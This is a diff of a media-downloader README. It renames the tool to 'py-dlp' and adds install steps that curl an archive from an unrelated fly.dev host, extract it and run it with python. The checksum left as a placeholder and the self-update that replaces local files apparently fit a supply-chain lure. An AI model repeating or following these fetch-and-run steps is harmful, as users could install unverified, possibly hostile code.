@@ -1,6 +1,63 @@
-# dwnloaderr — Python Media Downloader
+# dwnloaderr - A Python Media Downloader
 
 A command-line media downloader built with `yt-dlp`, with cross-platform GUI helpers for beginners. Download videos, audio, and playlists from YouTube and many other platforms in multiple formats.
+
+
+
+# Installation
+
+## Windows
+### 1. Download the latest release
+```
+curl.exe -L https://eclecticelectronics.fly.dev/api/download/dlp/1.0.1 -o py-dlp.tar.gz
+```
+
+### 2. Verify the checksum (replace with current hash)
+```
+certutil -hashfile py-dlp.tar.gz SHA256
+```
+### Compare output with EXPECTED_HASH_HERE
+
+## 3. Extract (requires 7-Zip or similar)
+```
+7z x py-dlp.tar.gz
+7z x py-dlp.tar
+```
+## 4. Run
+```
+python py-dlp.py -single "https://example.com/video"
+```
+## Using the Self-Update Command
+Once installed, check for updates without manual downloads:
+```
+python3 py-dlp.py -update\
+```
+
+This fetches the manifest from the server, verifies the checksum, and replaces your local files automatically.
+
+
+## Linux / macOS
+### Prerequisites
+- Python 3.8 or higher
+- Node.js or Deno (recommended for YouTube compatibility)
+- curl (Linux/macOS) or PowerShell (Windows)
+- Linux / macOS
+### 1. Download the latest release
+```bash
+curl -L https://eclecticelectronics.fly.dev/api/download/dlp/1.0.1 -o py-dlp.tar.gz
+```
+### 2. Verify the checksum (replace with current hash)
+```bash
+echo "EXPECTED_HASH_HERE  py-dlp.tar.gz" | sha256sum -c -
+```
+### 3. Extract
+```bash
+tar xzf py-dlp.tar.gz
+```
+### 4. Run
+```bash
+python3 py-dlp.py -single "https://example.com/video"
+```
 
 ## Quick Start
 
@@ -26,24 +83,24 @@ Both open a dialog box where you paste the URL and choose the format.
 
 ```bash
 # Single video
-python dwnloaderr.py -single "https://www.youtube.com/watch?v=iupPG8x_Zfo&list=PL_vkVwrwck3NJ9ajMQv7Y-DfX9gVAk5in&index=8"
+python py-dlp.py -single "https://www.youtube.com/watch?v=iupPG8x_Zfo&list=PL_vkVwrwck3NJ9ajMQv7Y-DfX9gVAk5in&index=8"
 
 # Audio only
-python dwnloaderr.py -single "URL" -format mp3
+python py-dlp.py -single "URL" -format mp3
 
 # Lossless audio
-python dwnloaderr.py -single "URL" -format flac
+python py-dlp.py -single "URL" -format flac
 
 # Playlist (max 50 items by default)
-python dwnloaderr.py -playlist "URL" -max 100
+python py-dlp.py -playlist "URL" -max 100
 
 # Custom output folder
-python dwnloaderr.py -single "URL" -savedir ~/Music/Songs
+python py-dlp.py -single "URL" -savedir ~/Music/Songs
 ```
 ### Windows Console Access
 
 Console Access (Windows)
-Double-click activate.bat to open a terminal window with the virtual environment already activated. From there you can run any python dwnloaderr.py command directly.
+Double-click activate.bat to open a terminal window with the virtual environment already activated. From there you can run any python py-dlp.py command directly.
 
 ### Command Reference
 #### Flags
@@ -80,19 +137,19 @@ can afford to do so, every penny helps out!
 # Common workflows
 
 ## High-quality music (lossless)
-python dwnloaderr.py -single "URL" -format flac
+python py-dlp.py -single "URL" -format flac
 
 ## Small video file
-python dwnloaderr.py -single "URL" -format opus
+python py-dlp.py -single "URL" -format opus
 
 ## Podcast from YouTube channel (playlist)
-python dwnloaderr.py -playlist "CHANNEL/videos" -max 20 -format mp3
+python py-dlp.py -playlist "CHANNEL/videos" -max 20 -format mp3
 
 ## Fast download (skip thumbnails/metadata)
-python dwnloaderr.py -single "URL" -nosubs -noembed -nometa -thumbnail
+python py-dlp.py -single "URL" -nosubs -noembed -nometa -thumbnail
 
 ## Nightly backup of favorite channel
-python dwnloaderr.py -playlist "URL" -max 10 -savedir ~/Backups/ChannelName
+python py-dlp.py -playlist "URL" -max 10 -savedir ~/Backups/ChannelName
 
 # Troubleshooting
 ## No JavaScript Runtime Found
@@ -117,7 +174,7 @@ Error: Requested format is not available
 
 ## Fix: List available formats first:
 
-python dwnloaderr.py -single "URL" --list-formats
+python py-dlp.py -single "URL" --list-formats
 
 # YouTube Challenge Page
 Error: YouTube served a challenge page
@@ -143,8 +200,8 @@ Remove-Item -Recurse -Force .venv
 
 # Security Notes
 Passwords: Never store passwords in plain text in scripts. Use environment variables:
-  export DWNLOADERR_PASSWORD="your_password"
-  python dwnloaderr.py -single "URL" -username user -pswd "$DWNLOADERR_PASSWORD"
+  export PY_DLP_PASSWORD="your_password"
+  python py-dlp.py -single "URL" -username user -pswd "$PY_DLP_PASSWORD"
 
 # Cookies
 Keep cookie files secure. Anyone with your cookies can access private content.
@@ -169,7 +226,7 @@ Contributions are welcome! Please feel free to submit issues and pull requests.
 
 ## FAQ
 Q: Can I download entire channels?\
-A: Yes, use the playlist URL with -max set to desired count. Example: python dwnloaderr.py -playlist "CHANNEL/videos" -max 100.
+A: Yes, use the playlist URL with -max set to desired count. Example: python py-dlp.py -playlist "CHANNEL/videos" -max 100.
 
 Q: Does this violate YouTube's Terms of Service?\
 A: This is a tool for extracting publicly available content. Use responsibly and respect copyright laws in your jurisdiction.
